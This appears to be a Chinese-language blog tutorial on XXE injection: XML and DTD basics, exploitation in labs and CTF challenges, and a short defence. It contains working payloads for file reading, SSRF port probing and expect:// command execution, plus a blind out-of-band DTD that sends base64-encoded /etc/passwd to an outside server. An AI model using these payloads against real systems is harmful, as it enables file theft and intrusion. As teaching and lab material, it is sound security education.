## 简介

XXE全称XML External Entity InjectionXML在引入外部实体的时候完成注入攻击称为XXE。那么它带来的危害有那些：

> 1.DOS攻击
>
> 2.SSRF攻击
>
> 3.使用file协议读取任意文件
>
> 4.端口探测
>
> 5.执行系统命令

### 1.什么是XML

XML是一种用来传输和存储数据的可扩展标记语言。

XML用于传输和数据存储。HTML用于显示数据。

**dtd**文档类型定义是一套为了进行程序见的数据交换而建立的关于标记符的语法规则。

#### 1.1 xml语法

语法规则

1.所有的XML元素都必须有一个关闭标签

2.XML标签对大小写敏感

3.XML必须正确嵌套

4.XML属性值必须加引号“”

5.实体引用：在标签属性，或者对应位置值可能出现<>符号，这些在对应的xml中都是特殊含义的，那么必须使用对应html的实体对应的表示:例如，`<message>if salary < 1000 then </message>`如果把这个“<”放在元素中，那么解析器会把他当成新元素的开始，就会发生报错。为了避免这个错误使用实体引用来代替`<message>if salary &lt; 1000 then </message>`

#### 1.2 xml结构

XML 文档声明，在文档的第一行

XML 文档类型定义，即DTD，XXE 漏洞所在的地方

XML 文档元素

#### 1.3 XML DTD（文档类型定义）

DTD的作用就是用来定义XML文档的合法构建模块DTD可以在XML文档内声明，也可以在外部引用。

```
内部声明DTD  <!DOCTYPE 根元素 [元素声明]>
外部声明DTD  <!DOCTYPE 根元素 SYSTEM "文件名">
<!DOCTYPE note SYSTEM "Note.dtd">
或者<!DOCTYPE 根元素 PUBLIC "public_ID" "文件名">
```

实例1.1:内部声明DTD

```
<?xml version="1.0"?>                       //xml声明
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body)>    //定义了note元素，并且note元素下面有4个子元素
<!ELEMENT to      (#PCDATA)>              //定义了子元素to，后面的（＃PCDATA）意思是to元素里面的字符串内容不会被解析
<!ELEMENT from    (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body    (#PCDATA)>
]>                                   //从<!DOCTYPE...到}>,是DTD文档的定义 
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>                                     //后面这部分就是XML文件内容
```

实例1.2:外部声明DTD

```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

这个`note.dtd`的内容就是:

```
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to      (#PCDATA)>
<!ELEMENT from    (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body    (#PCDATA)>
]>
```

DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。

```
内部声明实体 <!DOCTYPE 实体名称 "实体的值">
引用外部实体 <!DOCTYPE 实体名称 SYSTEM "URL">
或者 <!DOCTYPE 实体名称 PUBLIC "public_ID" "URL">
```

实例2.1:内部声明实体

```
<?xml version="1.0"?> 
<!DOCTYPE note[
<!ELEMENT note (name)> 
<!ENTITY hack3r "Hu3sky"> 
]> 
<note> <name>&hack3r;</name> </note>
```

实例2.2:外部声明实体外部实体用来引用外部资源,有两个关键字SYSTEM和PUBLIC两个,表示实体来自本地计算机还是公共计算机,外部实体的利用会用到协议如下:

不同语言下支持的协议:

![1612762454_6020cd56f1bb091df52fd.png!small](https://image.3001.net/images/20210208/1612762454_6020cd56f1bb091df52fd.png!small)

```
<?xml version="1.0"?> 
<!DOCTYPE note[ 
<!ELEMENT note (name)> 
<!ENTITY hack3r "http://www.chenguanxin.com"> 
]> 
<note> <name>&hack3r;</name> </note>
```

参数实体参数实体只能在DTD中定义和使用实体，一般的话引用时%作为前缀。而内部实体是指在一个实体中定义的另一个实体，说白了就是嵌套的。

```
<!ENTITY %实体名称 "值">
<!ENTITY %实体名称 SYSTEM "URL">
```

实例:

```
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;]>
<foo>&evil;</foo>
```

而里面引用的外部实体evil.dtd的内容:

```
<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
```

正因为外部实体支持的http,file等协议,那么就有可能通过以用外部实体进行远程文件读取。

### 2.xxe漏洞危害

综上所述，xxe漏洞就是允许了引入外部实体的加载，从而导致程序在解析xml的时候，可以加载恶意外部文件，从而造成文件读取等危害。

## 利用

**2.1 文件读取（有回显）**

xxe-php靶场演示：

![1612762580_6020cdd473ff01fc3b275.png!small](https://image.3001.net/images/20210208/1612762580_6020cdd473ff01fc3b275.png!small)

我们先看一下dologin.php代码

![1612762607_6020cdef9370b1873b9cd.png!small](https://image.3001.net/images/20210208/1612762607_6020cdef9370b1873b9cd.png!small)

libxml_disable_entity_loader(false);函数意思就是不禁止外部实体加载；file_get_contents()函数，把整个文件读入一个字符串中。LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件 通过php://input协议获取POST请求数据，然后把数据通过file_get_contents()函数，放在$xmlfile变量中。

我们先抓包，看一下

![1612762632_6020ce08a8e07080eb6af.png!small](https://image.3001.net/images/20210208/1612762632_6020ce08a8e07080eb6af.png!small)

传输类型是xml，通过post传输的数据。然后看一下返回的响应包

![1612762651_6020ce1b497d7ebed12b6.png!small](https://image.3001.net/images/20210208/1612762651_6020ce1b497d7ebed12b6.png!small)

发现，响应包返回的信息中，有username的值admin。

那么我么尝试构造payload来构造外部实体admin处的注入，利用协议读取文件

```
网站在window系统上搭建：
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY xxes SYSTEM "file:///c:/windows/win.ini"> ]>
<user><username>&xxes;</username><password>admin</password></user>
网站在linux系统上搭建：
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY xxes SYSTEM "file:///etc/passwd"> ]>
<user><username>&xxes;</username><password>admin</password></user>
```

![1612762676_6020ce34758d109d93631.png!small](https://image.3001.net/images/20210208/1612762676_6020ce34758d109d93631.png!small)

成功读取了c盘下win.in文件。

这种情况是提交请求后，响应有回显的时候。但是有时候没有回显的时候就可以使用Blind xxe。

**2.2 文件读取（无回显blind xxe）**

blind xxe虽然不回显信息，但是可以利用file协议来读取文件。对于这种情况，就可以用到参数实体了。用下面这个靶场演示一下

靶场地址：https://www.vulnspy.com/phpaudit-xxe/

在输入框输入构造的xxe代码，抓取请求包

![1612762705_6020ce5196139a5856d76.png!small](https://image.3001.net/images/20210208/1612762705_6020ce5196139a5856d76.png!small)

我们看到将我们提交的xxe代码，放在date里面，响应包没有返回我们要查询的信息，只有ok输出在页面上。

![1612762723_6020ce6352a52c6a59ce6.png!small](https://image.3001.net/images/20210208/1612762723_6020ce6352a52c6a59ce6.png!small)

对于没有回显，就要利用http协议将请求发送到远程服务器上，从而获取文件的内容。那么在我们自己的服务器上，写一个dtd文件

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://39.107.90.188:8081/%file;'>">
```

![1612762763_6020ce8bec987365de8fa.png!small](https://image.3001.net/images/20210208/1612762763_6020ce8bec987365de8fa.png!small)

然后在服务其上监听8081端口

![1612762783_6020ce9f405d8fcd18392.png!small](https://image.3001.net/images/20210208/1612762783_6020ce9f405d8fcd18392.png!small)

然后，我们将构造的xxe代码，输入到输入框并提交

```
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://39.107.90.188/evil.dtd">
%remote;%int;%send;
]>
```

![1612766352_6020dc9018474b66555fa.png!small](https://image.3001.net/images/20210208/1612766352_6020dc9018474b66555fa.png!small)

然后在vps看一下监听

![1612762832_6020ced060138666abd22.png!small](https://image.3001.net/images/20210208/1612762832_6020ced060138666abd22.png!small)

出现base64加密的数据，用base64解密内容：

![1612762862_6020ceee0f6c2cf49a9c4.png!small](https://image.3001.net/images/20210208/1612762862_6020ceee0f6c2cf49a9c4.png!small)

成功读取了passwd文件内容。

上面构造的payload，调用了%remote ,%int ,%send三个参数实体。一次利用顺序就是通过%remote调用远程服务器vps上，我们常见的evil.dtd文件，然后%int调用了evil.dtd中的%file，而%file就会获取服务读取敏感文件，然后将%file的结果放到%send之后，然后我们调用%send，把读取的数据以get请求发送到服务器vps上，这就是外带数据的结果。

**2.3 端口探测**

正因为xml外部实体攻击利用的http协议，也就是说利用该请求探测内网端口的存活，从而可以进行ssrf攻击。构造代码：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY xxes SYSTEM “http://127.0.0.1:8000"> 
]>
<user><username>&xxes;</username><password>admin</password></user>
```

**2.4命令执行**

前提是：在php环境中，如果说php扩展安装expect扩展，那么就能执行系统命令。构造代码：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY xxes SYSTEM "expect://id"> 
]>
<user><username>&xxes;</username><password>admin</password></user>
```

### 3.ctf题和vulnhub靶场(xxe)

**3.1 api调用**

是来自Jarvis OJ平台的一道web题型，地址http://web.jarvisoj.com:9882/

![1612762904_6020cf180ebfaf5111cc1.png!small](https://image.3001.net/images/20210208/1612762904_6020cf180ebfaf5111cc1.png!small)

看到题目说flag在/home/ctf/flag.txt中，那么就是访问这个目录了。

首先，我们看一下地址入口，页面是一个提交框，点击go后，把输入框输入的信息，提交到文本框中

![1612762985_6020cf69a3c68047ebfc3.png!small](https://image.3001.net/images/20210208/1612762985_6020cf69a3c68047ebfc3.png!small)

看一下响应包中的提交数据包和响应包数据：

![1612763004_6020cf7c0beffb49da85d.png!small](https://image.3001.net/images/20210208/1612763004_6020cf7c0beffb49da85d.png!small)

发现，提交数据是以json格式提交的数据。那么对于这种提交方式，去尝试会不会解析xml，那么要修改一下Content-type为xml，然后写一个xml，看响应包解不解析：

![1612763023_6020cf8f8f8b86ba4ce8f.png!small](https://image.3001.net/images/20210208/1612763023_6020cf8f8f8b86ba4ce8f.png!small)

可以看到返回的响应数据包中，返回输入了内容，也就是说服务器成功解析，是由回显的xxe，那么我么那就构造paly了。用我们平常构造的代码，看是否能读passwd文件数据：

构造paylaod

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPEANY[<!ENTITYxxesSYSTEM"file:///etc/passwd"> ]>
<root>
&xxes;</root>
```

![1612763087_6020cfcfd280e4ca0fe36.png!small](https://image.3001.net/images/20210208/1612763087_6020cfcfd280e4ca0fe36.png!small)

果然成功读出了passwd的内容，那么就去访问flag.txt文件了，构造代码payload：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPEANY[<!ENTITYxxesSYSTEM"file:///home/ctf/flag.txt"> ]>
<root>
&xxes;</root>
```

![1612763112_6020cfe80b21b4bed31f1.png!small](https://image.3001.net/images/20210208/1612763112_6020cfe80b21b4bed31f1.png!small)

看到成功获取了flag。

**3.2 vulnhub靶场**

这个靶场是透过我们平常渗透测试思路，信息收集，根据收集的信息查找漏洞，利用漏洞，一步步拿到flag。

网站搭建，下载虚拟机，直接导入vm中就行，下载https://download.vulnhub.com/xxe/XXE.zip

我们导入虚拟机后，需要密码账号进入，这里不需要。

![1612763149_6020d00defec7ea130dc3.png!small](https://image.3001.net/images/20210208/1612763149_6020d00defec7ea130dc3.png!small)

因为是虚拟机导入，就可以知道这个的ip地址：192.168.171.146，通过浏览器访问，出现apache2服务页面

![1612763168_6020d020ced1c5dad7341.png!small](https://image.3001.net/images/20210208/1612763168_6020d020ced1c5dad7341.png!small)

会不会含有其他目录呢，使用目录扫描扫描一下目录：

![1612763190_6020d036aa809b3836550.png!small](https://image.3001.net/images/20210208/1612763190_6020d036aa809b3836550.png!small)

发现robots.txt文件，访问一下：

![1612763207_6020d047ddb5a8afa4371.png!small](https://image.3001.net/images/20210208/1612763207_6020d047ddb5a8afa4371.png!small)

看到存在两个页面，访问xxe目录

![1612763228_6020d05cbecc4e20bfec9.png!small](https://image.3001.net/images/20210208/1612763228_6020d05cbecc4e20bfec9.png!small)

发现是一个登录页面，那么输入账号密码，看看响应包是什么数据

![1612763247_6020d06fd49b0b607cbdf.png!small](https://image.3001.net/images/20210208/1612763247_6020d06fd49b0b607cbdf.png!small)

看到通过xml传输数据，那么是不是可以利用xxe漏洞呢？那就尝试常用读取文件的payload：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPEANY[<!ENTITYxxeSYSTEM"file:///etc/passwd"> ]><root><name>&xxe;</name><password>admin</password></root>
```

![1612763267_6020d08347f4f4d508297.png!small](https://image.3001.net/images/20210208/1612763267_6020d08347f4f4d508297.png!small)

居然成功读取了，存在xxe漏洞。

我们再查看一下，刚才robots.txt中的admin.php页面

![1612763287_6020d09708282dfabc913.png!small](https://image.3001.net/images/20210208/1612763287_6020d09708282dfabc913.png!small)

需要登录，那就利用xxe漏洞读取admin.php源。

这里构造payload的时候，使用base64方法读取文件

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php"> ]><root><name>&xxe;</name><password>admin</password></root>
```

![1612763311_6020d0af6d2358b0c5cf5.png!small](https://image.3001.net/images/20210208/1612763311_6020d0af6d2358b0c5cf5.png!small)

将响应包中的base64编码解码：

![1612763329_6020d0c1491a431b09b5b.png!small](https://image.3001.net/images/20210208/1612763329_6020d0c1491a431b09b5b.png!small)

看到登录页面的密码和账号，但是账号md5加密，解密就ok

![1612763347_6020d0d3301c89ec4385b.png!small](https://image.3001.net/images/20210208/1612763347_6020d0d3301c89ec4385b.png!small)

利用账号administhebest和密码admin@123 登录页面：

![1612763367_6020d0e725d273ee4e1e8.png!small](https://image.3001.net/images/20210208/1612763367_6020d0e725d273ee4e1e8.png!small)

页面出现flag，点击进去，页面跳转到flagmeout.php

![1612763385_6020d0f9dc8a7303a2800.png!small](https://image.3001.net/images/20210208/1612763385_6020d0f9dc8a7303a2800.png!small)

页面不显示，那么再利用xxe漏洞读取该文件内容

![1612763399_6020d107f2cf5119cd023.png!small](https://image.3001.net/images/20210208/1612763399_6020d107f2cf5119cd023.png!small)

然后把得到base64解密：

![1612763423_6020d11f2c08880cf747d.png!small](https://image.3001.net/images/20210208/1612763423_6020d11f2c08880cf747d.png!small)

成功拿到flag<!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) -->

## xee防御

通过上面学习总结，xxe漏洞产生的原因是，允许加载了外部实体。那么要防御禁止外部实体加载。

libxml_disable_entity_loader(true);

将false不禁止外部实体加载，改为true禁止外部实体加载。